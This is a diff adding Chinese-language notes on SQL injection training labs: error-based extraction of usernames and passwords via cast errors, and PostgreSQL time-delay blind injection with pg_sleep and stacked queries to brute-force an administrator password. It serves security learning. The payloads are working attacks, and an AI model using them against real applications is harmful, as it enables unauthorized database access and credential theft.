@@ -118,3 +118,23 @@
 2. `' and cast((select username from users) as int)=1--`: 你会得到报错`Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'xMV6MCazpBFu8ng4' and cast((select username from users) as i'. Expected  char`，这意味着后端进行了截取处理，我们需要缩短请求的数据，考虑到我们在试图使其进行报错，我们可以直接在TrackingId上动手脚，例如直接删掉或缩短为几个字符。
 3. `' and cast((select username from users limit 1) as int)=1--`: 报错`ERROR: invalid input syntax for type integer: "administrator"`中可以泄漏数据`administrator`，如果第一个数据不是`administrator`的话，可以考虑使用`limit 2,1`和`offset`等语法，不过我尝试后得到`limit #,# syntax is not supported`，使用`offset`显然会超过字符数限制。
 4. `' and cast((select password from users limit 1) as int)=1--`: 可以从报错`ERROR: invalid input syntax for type integer: "hvhf525whwj4k8uvhjny"`中提取密码。
+
+## 14: Blind SQL injection with time delays
+
+> 什么信息都没有的时候可以使用延时盲注。
+
+需要注意的就是，一些不同后端sleep函数名不太一样，这里是PostgreSQL，需要使用`pg_sleep`，即在`TrackingId`字段后添加`'||pg_sleep(10)--`。
+
+## 15: Blind SQL injection with time delays and information retrieval
+
+> 对延时函数增加一些条件来进行对数据的猜测。需要注意的是，一般情况下我们选择将正确的情况进行延时，错误的情况不延时，因为大多数情况一定是猜解错误的，即`if true then sleep else nothing end`。
+
+这里同时使用了堆叠注入，即在原本的语句后用`;`隔开再拼接一个语句。
+
+1. 在`TrackingId`后添加`'%3bselect case when (1=1) then pg_sleep(5) else pg_sleep(0) end--`，其中`%3b`即为`;`，修改条件后确定盲注语句没有问题。
+2. `'%3bselect case when (select username='administrator') then pg_sleep(5) else pg_sleep(0) end from users--`: 确定存在`administrator`用户。
+3. `'%3bselect case when (select username='administrator' and length(password)>1) then pg_sleep(5) else pg_sleep(0) end from users--`: 对密码长度进行爆破。
+   + 这里爆破长度时可以将是否延时调换一下，因为对密码长度的猜测是从小到大，前面一定为真，后面一定为假，这样前面等待时间会短一点。
+4. 对密码进行爆破。
+   + 在BurpSuite中爆破时，intruder monitor默认不会显示响应时间，在菜单栏`Columns`中将其打开。
+
